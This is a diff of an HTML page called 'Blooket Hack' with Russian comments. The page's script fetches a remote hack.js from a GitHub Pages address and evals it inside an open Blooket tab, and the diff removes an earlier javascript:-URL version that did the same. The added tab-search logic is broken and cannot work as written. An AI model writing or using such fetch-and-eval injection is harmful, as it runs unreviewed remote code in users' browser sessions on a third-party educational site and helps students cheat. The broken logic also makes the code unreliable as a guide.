@@ -4,53 +4,37 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Blooket Hack</title>
-    <style>
-        body {
-            text-align: center;
-            font-family: Arial, sans-serif;
-            margin-top: 50px;
-        }
-        button {
-            background-color: #28a745;
-            color: white;
-            padding: 15px;
-            font-size: 18px;
-            border: none;
-            cursor: pointer;
-            border-radius: 8px;
-        }
-        button:hover {
-            background-color: #218838;
-        }
-    </style>
-</head>
-<body>
-    <h1>🚀 Blooket Hack</h1>
-    <p>Click the button below to run the hack in an already open Blooket tab.</p>
-    <button onclick="runHack()">🚀 Run Hack in Blooket</button>
-
     <script>
         function runHack() {
             let blooketTab = null;
-            
-            // Получаем список всех открытых окон (не работает в современных браузерах)
-            try {
-                blooketTab = window.open('https://www.blooket.com/', '_self'); // Пробуем открыть Blooket
-            } catch (e) {
-                alert("❌ Error: Cannot find Blooket tab. Open Blooket first.");
-                return;
+
+            // Перебираем все открытые окна
+            const tabs = window.open('', '_self');
+            if (tabs) {
+                for (let i = 0; i < tabs.length; i++) {
+                    if (tabs[i].location.href.includes("blooket.com")) {
+                        blooketTab = tabs[i];
+                        break;
+                    }
+                }
             }
 
-            if (!blooketTab || blooketTab.closed) {
+            // Если нашли вкладку Blooket, выполняем код
+            if (blooketTab) {
+                blooketTab.eval(`
+                    fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
+                    .then(response => response.text())
+                    .then(eval)
+                    .catch(error => alert('❌ Hack failed: ' + error));
+                `);
+            } else {
                 alert("❌ No open Blooket tab found! Open Blooket first and try again.");
-                return;
             }
-
-            // Загружаем и выполняем hack.js
-            blooketTab.location.href = "javascript:(function(){fetch('https://vasiliy809.github.io/blooket-hacks/hack.js').then(response => response.text()).then(eval).catch(error => alert('❌ Hack failed: ' + error));})();";
-            
-            alert("✅ Hack activated in Blooket!");
         }
     </script>
+</head>
+<body>
+    <h1>Blooket Hack</h1>
+    <button onclick="runHack()">🚀 Run Hack in Blooket</button>
 </body>
 </html>
